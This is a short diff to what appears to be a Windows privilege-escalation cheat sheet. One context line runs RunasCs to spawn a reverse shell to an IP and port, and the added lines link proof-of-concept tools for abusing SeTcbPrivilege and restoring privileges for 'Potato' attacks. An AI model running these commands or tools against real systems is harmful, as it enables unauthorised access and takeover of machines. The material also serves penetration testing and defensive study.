@@ -53,3 +53,8 @@ to read the full clear text password
 .\RunasCs.exe user pass cmd.exe -r IP:PORT
 ```
 
+## SeTcbPrivilege - https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e?gi=90b131f043b3 
+
+Using tcbpriv is done trough a poc - https://github.com/b4lisong/SeTcbPrivilege-Abuse 
+
+Or use Full powers https://github.com/itm4n/FullPowers to Potato stile attacks. 
